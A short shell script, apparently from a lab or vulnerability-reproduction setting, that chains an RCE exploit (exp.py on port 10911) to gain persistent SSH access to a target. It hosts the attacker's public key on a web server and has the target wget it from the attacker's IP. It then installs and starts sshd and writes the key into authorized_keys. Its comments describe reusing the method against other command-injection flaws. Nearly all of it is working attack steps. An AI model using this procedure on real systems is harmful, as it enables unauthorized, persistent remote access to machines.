#!/usr/bin/env sh
# add the ssh key of attacker into target's authorized_keys to enable ssh link without key
# in this example: target-ip = 172.17.0.2, attacker-ip = 172.17.0.3
# TODO: only executed this commands line by line manually, should test whether we can directly run ./get_shell.sh to run it.
# This method can be migrated to other RCE vulnerabilities, just change [python3 exp.py 172.17.0.2 10911] to other command injection instructions

# transfer public key to target machine
apt-get install apache2
service apache2 status
cp ~/.ssh/id_rsa.pub /var/www/key.txt
python3 exp.py 172.17.0.2 10911 wget http://172.17.0.3:80/key.txt 
service apache2 stop

# start the ssh service of target machine
# the command is executed by a 30s cron job, therefore, we should wait for the previous job to be completed
sleep 40
python3 exp.py 172.17.0.2 10911 apt-get install -y openssh-server
sleep 100
python3 exp.py 172.17.0.2 10911 service ssh start
sleep 40
python3 exp.py 172.17.0.2 10911 mkdir ~/.ssh
sleep 40
python3 exp.py 172.17.0.2 10911 cp key.txt ~/.ssh/authorized_keys

# access to target shell successfully
ssh 172.17.0.2
